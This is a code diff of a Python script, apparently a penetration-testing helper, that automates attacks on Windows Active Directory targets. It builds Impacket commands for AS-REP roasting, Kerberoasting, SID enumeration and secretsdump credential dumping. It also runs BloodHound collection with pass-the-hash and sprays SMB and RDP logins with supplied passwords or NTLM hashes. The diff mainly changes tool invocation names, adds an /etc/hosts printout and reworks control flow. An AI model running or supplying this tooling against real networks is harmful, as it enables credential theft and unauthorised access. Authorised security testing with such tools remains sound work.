@@ -68,22 +68,22 @@ i = f"{DOMAIN}/{USERNAME}:{PASSWORD}@{RHOST}"
 ih = f"{DOMAIN}/{USERNAME}@{RHOST} -hashes :{HASH}"
 iwd = f"/{USERNAME}:{PASSWORD}@{RHOST}"
 iwdh = f"/{USERNAME}@{RHOST} -hashes :{HASH}"
-inp = f"impacket-GetNPUsers {i}"
-inph = f"impacket-GetNPUsers {ih}"
-ispn = f"impacket-GetUserSPNs {i}"
-ispnh = f"impacket-GetUserSPNs {ih}"
-isid = f"impacket-lookupsid {i}"
-isidh = f"impacket-lookupsid {ih}"
-isec = f"impacket-secretsdump {i}"
-isech = f"impacket-secretsdump {ih}"
-linp = f"impacket-GetNPUsers {iwd}"
-linph = f"impacket-GetNPUsers {iwdh}"
-lispn = f"impacket-GetUserSPNs {iwd}"
-lispnh = f"impacket-GetUserSPNs {iwdh}"
-lisid = f"impacket-lookupsid {iwd}"
-lisidh = f"impacket-lookupsid {iwdh}"
-lisec = f"impacket-secretsdump {iwd}"
-lisech = f"impacket-secretsdump {iwdh}"
+inp = f"GetNPUsers.py {i}"
+inph = f"GetNPUsers.py {ih}"
+ispn = f"GetUserSPNs.py {i}"
+ispnh = f"GetUserSPNs.py {ih}"
+isid = f"lookupsid.py {i}"
+isidh = f"lookupsid.py {ih}"
+isec = f"secretsdump.py {i}"
+isech = f"secretsdump.py {ih}"
+linp = f"GetNPUsers.py {iwd}"
+linph = f"GetNPUsers.py {iwdh}"
+lispn = f"GetUserSPNs.py {iwd}"
+lispnh = f"GetUserSPNs.py {iwdh}"
+lisid = f"lookupsid.py {iwd}"
+lisidh = f"lookupsid.py {iwdh}"
+lisec = f"secretsdump.py {iwd}"
+lisech = f"secretsdump.py {iwdh}"
 
 def NMAPR():
     print(f"{YELLOW}Running NMAP against target to not waste your time{RESET}\n")
@@ -706,6 +706,14 @@ def BLOODH():
     s = Popen([f"bloodhound-python -d {content} -u {USERNAME} --hashes 00000000000000000000000000000000:{HASH} -c all -ns {RHOST}"], shell=True)
     s.wait()
 
+def HOSTS():
+    with open ("domain_name.txt", "r") as f:
+        content = f.read()
+        print (f"{YELLOW}IP address is {MAGENTA}{RHOST}{RESET}")
+    with open ("/etc/hosts", "r") as f:
+        content = f.read()
+        print(content)
+
 def REMINDER():
     print(f"{MAGENTA}\nReminder you have {RED}{Z}{RESET}{MAGENTA} on the following (if any){RED}\n")
     s = Popen([f"cat *.txt | grep {Z}"], shell=True)
@@ -740,25 +748,21 @@ if TEST is not False and PASSWORD != None:
         SMBSTAT()
         LDAPTEST()
         LANEBOY()
-        quit()
     else:
         TESTME()
         SMBSTAT()
         LANEBOY()
-        quit()
 if TEST is not False and HASH != None:
     if L is not False:
         TESTMEH()
         LDAPTEST()
         SMBSTAT()
         LANEBOY()
-        quit()
     else:
         TESTMEH()
         SMBSTAT()
         LANEBOY()
-        quit()
-if PASSWORD != None:
+if PASSWORD != None and TEST is not True:
     if L is not False:
         SMBUP()
         RDPUP()
@@ -771,7 +775,6 @@ if PASSWORD != None:
         SMBSTAT()
         REMINDER()
         EYELIDS()
-        quit()
     else:
         SMBUP()
         RDPUP()
@@ -783,8 +786,7 @@ if PASSWORD != None:
         SMBSTAT()
         REMINDER()
         EYELIDS()
-        quit()
-if HASH != None:
+if HASH != None and TEST is not True:
     print(f"Trying with hash {HASH}")
     if L is not False:
         SMBH()
@@ -798,7 +800,6 @@ if HASH != None:
         SMBSTAT()
         REMINDER()
         VIOLENCE()
-        quit()
     else:
         SMBH()
         RDPH()
@@ -810,9 +811,14 @@ if HASH != None:
         SMBSTAT()
         REMINDER()
         VIOLENCE()
-        quit()
+if IMP is not False and DOMAIN == None:
+    D()
+    print(f"{RED}Need -d argument for domain name shown above{RESET}")
+    quit()
 if IMP is not False and DOMAIN != None:
-    input("Put domain name in /etc/hosts, press enter to continue")
+    D()
+    HOSTS()
+    input(f"{RED}Put domain name in /etc/hosts, press enter to continue{RESET}")
     if PASSWORD != None:
         IMPACKETADUP()
     if HASH != None:
